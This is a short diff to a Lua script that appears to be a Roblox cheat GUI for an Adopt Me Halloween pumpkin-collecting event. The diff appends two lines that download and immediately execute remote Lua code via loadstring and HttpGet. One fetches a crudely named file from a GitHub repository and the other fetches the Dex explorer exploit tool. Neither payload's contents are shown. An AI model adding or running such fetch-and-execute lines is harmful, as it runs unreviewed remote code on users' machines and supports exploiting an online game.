@@ -356,3 +356,6 @@ local GetPumpkinBtn = Tab:CreateButton({
         print("Fetching pumpkins completed")
     end
 })
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BoredScripter/AdoptMeHalloweenPublic/refs/heads/main/fuck.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
